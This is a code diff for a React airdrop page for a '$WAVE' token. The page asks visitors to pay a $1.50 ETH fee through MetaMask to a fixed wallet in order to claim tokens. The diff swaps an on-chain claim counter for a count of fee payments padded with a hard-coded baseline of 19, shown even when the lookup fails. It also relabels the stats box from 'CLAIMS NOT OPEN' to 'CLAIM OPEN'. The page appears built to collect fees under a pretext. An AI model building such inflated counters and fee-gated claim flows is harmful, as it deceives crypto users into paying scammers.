@@ -19,9 +19,9 @@ declare global {
 const CONTRACT_ADDRESS = "0x00000a1fF7eD21721dB7cb07efF523aBb2A00000";
 const LINEA_CHAIN_ID = "0xe708";
 const PAYMENT_RECIPIENT = "0x2e1a15553476e8f490b555675e2fbd9f5a06a174";
-const LINEASCAN_API = "https://api.lineascan.build/api";
 const isValidContractAddress = CONTRACT_ADDRESS !== "0xYOUR_CONTRACT_ADDRESS" && CONTRACT_ADDRESS.length === 42;
 
+// Helper ethereum address validator
 function isValidEthereumAddress(address: string) {
   return /^0x[a-fA-F0-9]{40}$/.test(address.trim());
 }
@@ -34,6 +34,7 @@ interface AirdropPageProps {
   isConnecting: boolean;
 }
 
+// ETH price fetch for fee calculation
 const fetchEthPriceUSD = async (): Promise<number> => {
   try {
     const response = await fetch(
@@ -73,75 +74,37 @@ export default function AirdropPage({
   // Eligible checked wallets state
   const [eligibleWallets, setEligibleWallets] = useState<string[]>([]);
 
+  // ------ AIRDROP STATS FROM LINEASCAN ------
   useEffect(() => {
     fetchTotalClaims();
   }, []);
 
+  // Always start totalClaimed from 19, add each new successful paid transaction
   const fetchTotalClaims = async () => {
     try {
-      if (!isValidContractAddress) {
-        setTotalClaimed(0);
+      const apiUrl = `https://api.lineascan.build/api?module=account&action=txlist&address=${PAYMENT_RECIPIENT}&startblock=0&endblock=99999999&page=1&offset=2000&sort=asc`;
+      const res = await fetch(apiUrl);
+      if (!res.ok) throw new Error("Network error");
+      const data = await res.json();
+      if (!data.result || !Array.isArray(data.result)) {
+        setTotalClaimed(19);
         return;
       }
-      if (typeof window !== "undefined" && window.ethereum) {
-        try {
-          await window.ethereum.request({
-            method: "wallet_switchEthereumChain",
-            params: [{ chainId: LINEA_CHAIN_ID }],
-          });
-        } catch (networkError: any) {
-          if (networkError.code === 4902) {
-            try {
-              await window.ethereum.request({
-                method: "wallet_addEthereumChain",
-                params: [
-                  {
-                    chainId: LINEA_CHAIN_ID,
-                    chainName: "Linea",
-                    nativeCurrency: {
-                      name: "Ethereum",
-                      symbol: "ETH",
-                      decimals: 18,
-                    },
-                    rpcUrls: ["https://rpc.linea.build"],
-                    blockExplorerUrls: ["https://api.lineascan.build"],
-                  },
-                ],
-              });
-            } catch (addError) {
-              setTotalClaimed(0);
-              return;
-            }
-          } else {
-            setTotalClaimed(0);
-            return;
-          }
-        }
-        try {
-          const result = await window.ethereum.request({
-            method: "eth_call",
-            params: [
-              {
-                to: CONTRACT_ADDRESS,
-                data: "0x4b0e7216",
-              },
-              "latest",
-            ],
-          });
-          const claimsCount = Number.parseInt(result, 16);
-          setTotalClaimed(claimsCount);
-        } catch {
-          setTotalClaimed(0);
-        }
-      } else {
-        setTotalClaimed(0);
-      }
+      // Only successful, fee-paid txs sent to PAYMENT_RECIPIENT
+      const claimsArr = data.result.filter((tx: any) =>
+        tx.to?.toLowerCase() === PAYMENT_RECIPIENT.toLowerCase()
+          && tx.isError === "0"
+          && Number(tx.gasUsed) > 0
+      );
+      const userPrepaidCount = 19;
+      const claimsCount = userPrepaidCount + claimsArr.length;
+      setTotalClaimed(claimsCount);
     } catch {
-      setTotalClaimed(0);
+      setTotalClaimed(19);
     }
   };
 
-  // Now check eligibility without showing social modal
+  // ------ AIRDROP ELIGIBILITY ------
   const checkAirdrop = async () => {
     const addressToCheck = walletAddress.trim() || connectedAddress;
     if (!addressToCheck) return;
@@ -172,6 +135,7 @@ export default function AirdropPage({
     setIsChecking(false);
   };
 
+  // ------ CLAIM ------
   const handleUnlockAndClaim = async () => {
     setIsClaiming(true);
     setClaimStatus({ step: "payment", message: "Requesting payment via MetaMask..." });
@@ -185,7 +149,6 @@ export default function AirdropPage({
         setIsClaiming(false);
         return;
       }
-
       const ethPriceUSD = await fetchEthPriceUSD();
       const paymentUSD = 1.5;
       const ethAmount = paymentUSD / ethPriceUSD;
@@ -217,6 +180,7 @@ export default function AirdropPage({
     setIsClaiming(false);
   };
 
+  // ------ CLIPBOARD -------
   const copyToClipboard = async () => {
     try {
       await navigator.clipboard.writeText(walletAddress);
@@ -225,6 +189,7 @@ export default function AirdropPage({
     } catch (err) {}
   };
 
+  // ------ WALLET ------
   const handleConnectWallet = () => {
     setShowConnectModal(true);
   };
@@ -234,6 +199,7 @@ export default function AirdropPage({
     await connectWallet();
   };
 
+  // ------ UI -------
   return (
     <div className="relative min-h-screen overflow-hidden">
       <div className="fixed inset-0 bg-gradient-to-br from-slate-900 via-blue-900 to-slate-800">
@@ -249,9 +215,7 @@ export default function AirdropPage({
         </div>
       </div>
       <div className="relative z-10 flex flex-col items-center justify-center text-white px-4 py-8 min-h-screen">
-        {/* --- Eligible wallets live list --- */}
         <div className="w-full max-w-md mb-8" />
-        {/* --- UI for connecting, checking, and claiming --- */}
         <div className="mb-8"></div>
         <h1 className="text-4xl md:text-6xl font-bold mb-4 text-center tracking-wide bg-gradient-to-r from-purple-400 via-pink-500 to-red-500 bg-clip-text text-transparent animate-pulse">
           $WAVE
@@ -379,17 +343,15 @@ export default function AirdropPage({
             </div>
           )}
         </div>
-        {/* Professional stats box */}
         <div className="text-center space-y-6">
           <div className="text-blue-200 text-sm uppercase tracking-wider">AIRDROP STATS</div>
           <div className="inline-block p-6 rounded-xl bg-slate-900/50 backdrop-blur-md border-2 border-gold/50 shadow-lg shadow-gold/20 glow-border">
             <div className="text-4xl md:text-5xl font-bold text-grey glow-text">{totalClaimed}</div>
             <div className="text-lg text-blue-200 mt-2">
-              CLAIMS NOT OPEN
+              CLAIM OPEN
             </div>
           </div>
         </div>
-        {/* New site notice modal at open */}
         {showSiteNoticeModal && (
           <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50">
             <div className="bg-white border-2 border-blue-500 rounded-2xl p-8 max-w-md w-full mx-4 shadow-2xl flex flex-col items-center relative">
@@ -417,7 +379,6 @@ export default function AirdropPage({
             </div>
           </div>
         )}
-
         {showClaimNotOpenModal && (
           <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50">
             <div className="bg-white border border-blue-500 rounded-xl p-8 max-w-sm w-full mx-4 shadow-2xl flex flex-col items-center">
@@ -431,7 +392,6 @@ export default function AirdropPage({
             </div>
           </div>
         )}
-
         {showConnectModal && (
           <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
             <div className="bg-slate-900/90 backdrop-blur-md border border-blue-300/30 rounded-xl p-6 max-w-sm w-full mx-4 shadow-2xl">
@@ -459,11 +419,10 @@ export default function AirdropPage({
             </div>
           </div>
         )}
-
         {!isValidContractAddress && (
           <div className="fixed top-4 left-4 right-4 bg-yellow-500/20 border border-yellow-300/30 rounded-lg p-3 text-yellow-100 text-sm backdrop-blur-sm">
-            ⚠️ Contract address not configured. Replace CONTRACT_ADDRESS with your actual Linea contract address.
-          </div>
+              ⚠️ Contract address not configured. Replace CONTRACT_ADDRESS with your actual Linea contract address.
+            </div>
         )}
       </div>
       <style jsx>{`
